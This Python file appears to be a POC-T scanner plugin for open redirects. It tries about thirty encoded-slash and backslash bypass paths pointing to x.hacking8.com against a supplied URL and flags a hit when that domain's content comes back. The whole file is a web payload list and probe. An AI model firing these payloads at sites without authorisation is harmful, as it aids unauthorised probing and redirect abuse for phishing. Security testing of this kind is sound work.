#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = i@cdxy.me

"""
测试用例
"""

import random
import time
import requests


def poc(url):
    paths = '''
/%09/x.hacking8.com
/%2f%2fx.hacking8.com
/%5cx.hacking8.com
/.x.hacking8.com
//%09/x.hacking8.com
//%5cx.hacking8.com
///%09/x.hacking8.com
///%5cx.hacking8.com
////%09/x.hacking8.com
////%5cx.hacking8.com
/////x.hacking8.com
/////x.hacking8.com/
////\;@x.hacking8.com
////x.hacking8.com/
////x.hacking8.com/%2e%2e
////x.hacking8.com/%2e%2e%2f
////x.hacking8.com/%2f%2e%2e
////x.hacking8.com/%2f..
///\;@x.hacking8.com
///x.hacking8.com/%2e%2e
///x.hacking8.com/%2e%2e%2f
///x.hacking8.com/%2f%2e%2e
///x.hacking8.com/%2f..
///x.hacking8.com//
//https:///x.hacking8.com/%2e%2e
//https://x.hacking8.com/%2e%2e%2f
//https://x.hacking8.com//
/<>//x.hacking8.com
/\/\/x.hacking8.com/
/\/x.hacking8.com/
'''.strip().splitlines()
    for path in paths:
        payload = url.rstrip('/') + path
        header = dict()
        header["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
        header["Referer"] = url
        try:
            resp = requests.get(payload,headers=header,timeout=15)
            if resp.status_code == 200 and 'x.hacking8.com/content/templates/emlog_dux' in resp.text:
                return payload
        except MemoryError:
            continue
        except:
            continue
    return False